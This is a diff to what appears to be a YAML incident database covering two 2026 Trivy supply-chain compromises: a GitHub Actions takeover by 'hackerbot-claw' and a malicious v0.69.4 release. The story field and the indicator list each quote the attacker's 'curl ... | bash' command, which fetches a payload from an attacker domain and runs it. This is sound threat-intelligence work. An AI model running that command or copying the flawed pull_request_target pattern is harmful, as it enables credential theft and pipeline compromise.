@@ -1,14 +1,16 @@
----
 - id: trivy-hackerbot-claw
-  title: Trivy Repository Takeover via hackerbot-claw
-  synopsis: The hackerbot-claw account exploited a pull_request_target workflow in
-    aquasecurity/trivy to run untrusted fork code with repository privileges. The
-    stolen token was used to push directly to the repository, vandalize the README,
-    temporarily privatize and rename the project, replace it with an empty repository,
-    delete release assets from v0.27.0 through v0.69.1, and publish a suspicious Trivy
-    VS Code extension artifact. Aqua restored the repository, revoked publishing tokens,
-    removed the vulnerable workflow, and republished v0.69.2 while rebuilding release
-    assets.
+  title: Trivy repository takeover installed hackerbot-claw
+  synopsis: >-
+    The hackerbot-claw account exploited a pull_request_target workflow in aquasecurity/trivy
+    to run untrusted fork code with repository privileges.
+  story: |
+    The first Trivy incident was a GitHub Actions takeover, not a poisoned Trivy release. The `hackerbot-claw` account opened pull request 10254 with a harmless-looking branch name and triggered Trivy's API Diff Check workflow.
+
+    The workflow used `pull_request_target`, then checked out the attacker's fork code and ran repository scripts with elevated permissions. The attacker modified `.github/actions/setup-go/action.yaml` so the normal Go setup step executed `curl -sSfL https://hackmoltrepeat.com/molt | bash`.
+
+    That execution path stole a Personal Access Token. With the token, the attacker took over the repository, removed releases, pushed changes, and disrupted the public project. StepSecurity described Trivy as the most damaging repository compromise in the hackerbot-claw wave.
+
+    The later March 2026 Trivy v0.69.4 compromise is modeled separately because it used remaining credentials to publish malicious artifacts and move action tags. This record covers the February repository takeover that made the second incident possible.
   start_date: 2026-02-28
   end_date: 2026-03-01
   target:
@@ -44,10 +46,24 @@
       role: distribution
     - uri: https://github.com/aquasecurity/trivy/commit/d267cc4
       role: distribution
-    - uri: https://open-vsx.org/extension/aquasecurityofficial/trivy-vulnerability-scanner
+    - uri: 
+        https://open-vsx.org/extension/aquasecurityofficial/trivy-vulnerability-scanner
       role: distribution
     commits:
     - d267cc4
+    indicators:
+    - kind: pull_request
+      value: PR #10254
+    - kind: file
+      value: .github/actions/setup-go/action.yaml
+    - kind: technique
+      value: pull_request_target
+    - kind: command
+      value: curl -sSfL https://hackmoltrepeat.com/molt | bash
+    - kind: domain
+      value: hackmoltrepeat.com
+    - kind: account
+      value: hackerbot-claw
     notes:
     - Release assets in this range were deleted during the repository takeover.
     - Trivy v0.69.2 was the restored release after the takeover.
@@ -57,15 +73,11 @@
   - url: https://github.com/aquasecurity/trivy/discussions/10265
     title: Official information about Trivy repository takeover incident
 - id: trivy-second-compromise
-  title: Trivy v0.69.4 Release and Action Compromise
-  synopsis: After incomplete containment of the February Trivy takeover, compromised
-    credentials were used to publish malicious Trivy v0.69.4 artifacts, force-push
-    most trivy-action version tags, and replace setup-trivy tags with credential-stealing
-    commits. The payloads read GitHub Actions runner memory and process environments,
-    collected developer and cloud secrets, encrypted the data, and exfiltrated to
-    the typosquatted domain scan.aquasecurtiy.org or fallback public tpcp-docs repositories.
-    Compromised Docker Hub images followed on March 22. Aqua deleted affected tags,
-    released fixed action versions, and published GHSA-69fq-xp46-6x23 / CVE-2026-33634.
+  title: Trivy release actions shipped malware
+  synopsis: >-
+    After incomplete containment of the February Trivy takeover, compromised credentials were
+    used to publish malicious Trivy v0.69.4 artifacts, force-push most trivy-action version
+    tags, and replace setup-trivy tags with credential-stealing commits.
   story: |
     The second Trivy compromise was a containment failure with a long tail. After the February takeover, attackers still had usable access. On March 19, 2026, they used compromised credentials to publish Trivy v0.69.4 artifacts and to change action tags that existing CI/CD workflows already trusted.
 
@@ -154,12 +166,12 @@
     - uri: https://github.com/aquasecurity/trivy/releases/tag/v0.69.4
       role: distribution
     notes:
-    - Aqua's disclosure window covered Trivy v0.69.4 release artifacts, including
-      distribution paths such as GHCR, ECR Public, Docker Hub, deb, rpm, and get.trivy.dev;
-      Docker Hub tags are also tracked as their own artifact group.
-    - The Register reported Mandiant's estimate of more than 1,000 impacted SaaS
-      environments from the wider Trivy supply-chain attack; this is recorded as
-      a lower-bound impact count rather than an exact user count.
+    - Aqua's disclosure window covered Trivy v0.69.4 release artifacts, including 
+      distribution paths such as GHCR, ECR Public, Docker Hub, deb, rpm, and 
+      get.trivy.dev; Docker Hub tags are also tracked as their own artifact group.
+    - The Register reported Mandiant's estimate of more than 1,000 impacted SaaS 
+      environments from the wider Trivy supply-chain attack; this is recorded as a 
+      lower-bound impact count rather than an exact user count.
   - id: aquasec-trivy
     name: Trivy Docker images
     package: aquasec/trivy
@@ -184,10 +196,11 @@
     references:
     - url: https://socket.dev/blog/trivy-docker-images-compromised
     notes:
-    - Socket reported Docker image tags 0.69.4, 0.69.5, 0.69.6, and latest as compromised
-      on March 22, with no corresponding GitHub releases for the later image tags.
-    - A mutable latest tag or release channel was reported affected; it is recorded
-      as scope rather than a fixed version identifier.
+    - Socket reported Docker image tags 0.69.4, 0.69.5, 0.69.6, and latest as 
+      compromised on March 22, with no corresponding GitHub releases for the later image
+      tags.
+    - A mutable latest tag or release channel was reported affected; it is recorded as 
+      scope rather than a fixed version identifier.
   - id: aquasecurity-trivy-action
     name: trivy-action tags
     package: aquasecurity/trivy-action
@@ -205,7 +218,7 @@
     - uri: https://github.com/aquasecurity/trivy-action
       role: distribution
     notes:
-    - Aqua's exposure table listed all trivy-action tags except 0.35.0 as affected
+    - Aqua's exposure table listed all trivy-action tags except 0.35.0 as affected 
       during the March 19-20 UTC window; SHA-pinned references were not affected.
   - id: aquasecurity-setup-trivy
     name: setup-trivy tags
@@ -224,23 +237,28 @@
     commits:
     - 8afa9b9
     notes:
-    - The compromised setup-trivy tags installed the malicious Trivy binary; StepSecurity
-      noted 8afa9b9 was a legitimate commit reference that led workflows to the compromised
-      v0.69.4 binary.
-    - Affected setup-trivy scope was reported as all releases before 0.2.6; exact
-      lower bound is not recorded.
+    - The compromised setup-trivy tags installed the malicious Trivy binary; 
+      StepSecurity noted 8afa9b9 was a legitimate commit reference that led workflows to
+      the compromised v0.69.4 binary.
+    - Affected setup-trivy scope was reported as all releases before 0.2.6; exact lower 
+      bound is not recorded.
   references:
-  - url: https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release
+  - url: 
+      https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release
     title: Trivy Compromised a Second Time - Malicious v0.69.4 Release
-  - url: https://www.stepsecurity.io/blog/canisterworm-how-a-self-propagating-npm-worm-is-spreading-backdoors-across-the-ecosystem
-    title: CanisterWorm - How a Self-Propagating npm Worm Is Spreading Backdoors Across the Ecosystem
+  - url: 
+      https://www.stepsecurity.io/blog/canisterworm-how-a-self-propagating-npm-worm-is-spreading-backdoors-across-the-ecosystem
+    title: CanisterWorm - How a Self-Propagating npm Worm Is Spreading Backdoors Across 
+      the Ecosystem
   - url: https://github.com/advisories/GHSA-69fq-xp46-6x23
     title: 'GitHub Advisory: Trivy supply chain compromise'
   - url: https://github.com/aquasecurity/trivy/discussions/10425
     title: Trivy v0.69.4 supply chain compromise discussion
   - url: https://socket.dev/blog/trivy-docker-images-compromised
     title: Trivy Docker Images Compromised in Supply Chain Attack
-  - url: https://www.theregister.com/special-features/2026/03/24/1k-cloud-environments-infected-via-trivy-attack/5226043
+  - url: 
+      https://www.theregister.com/special-features/2026/03/24/1k-cloud-environments-infected-via-trivy-attack/5226043
     title: 1K+ cloud environments infected following Trivy supply chain attack
-  - url: https://blog.dreamfactory.com/five-supply-chain-attacks-in-twelve-days-how-march-2026-broke-open-source-trust-and-what-comes-next
+  - url: 
+      https://blog.dreamfactory.com/five-supply-chain-attacks-in-twelve-days-how-march-2026-broke-open-source-trust-and-what-comes-next
     title: Five Supply Chain Attacks in Twelve Days
